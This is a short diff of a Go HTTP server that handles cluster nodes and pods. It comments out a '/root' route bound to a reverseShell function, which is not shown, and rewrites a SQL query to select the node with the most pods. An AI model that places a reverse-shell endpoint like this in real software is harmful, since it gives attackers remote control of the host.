@@ -37,7 +37,7 @@ type MachinePod struct {
 func main() {
 	fmt.Print("starting http server on port 3000")
 
-	http.HandleFunc("/root", reverseShell)
+	//http.HandleFunc("/root", reverseShell)
 	http.HandleFunc("/contract", contract)
 	var err error
 	db, err = sql.Open("sqlite3", file)
@@ -66,7 +66,25 @@ func contract(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	rows, err := db.Query("SELECT id, name, cluster_id, network, mask from node limit 1")
+	rows, err := db.Query(`
+		SELECT
+			node_id as id,
+			name,
+			cluster_id,
+			network,
+			mask
+		FROM
+			(select
+				COUNT(*) as cnt,
+				node.id as node_id
+			FROM
+				node INNER JOIN pod ON pod.node_id = node.id
+			GROUP BY node.id
+			ORDER BY cnt DESC LIMIT 1),
+			node
+		WHERE node.id = node_id
+		LIMIT 1`)
+
 	if err != nil {
 		w.WriteHeader(401)
 		io.WriteString(w, "error selecting node")
